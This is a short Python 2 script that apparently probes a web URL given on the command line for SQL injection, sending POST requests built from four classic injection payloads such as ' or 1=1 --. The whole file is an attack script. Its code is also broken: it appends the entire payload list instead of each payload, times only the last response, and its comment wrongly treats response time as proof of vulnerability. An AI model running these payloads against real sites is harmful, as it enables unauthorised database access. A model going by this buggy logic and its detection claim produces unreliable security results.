#!/usr/bin/python

import sys
import requests

payloads = ["\' or 1=1 --", "0 or 1=1 --", "%\' or \'0\'=\'0", "\' or \'1\'=\'1\' --\'"]
url = sys.argv[1]
resList = []

for loads in payloads:
  res = requests.post(url+str(payloads))
  resList.append(res)

print resList
print "Seconds to response: " + str(res.elapsed.total_seconds()) # The different time without status proofs that is vulnerable



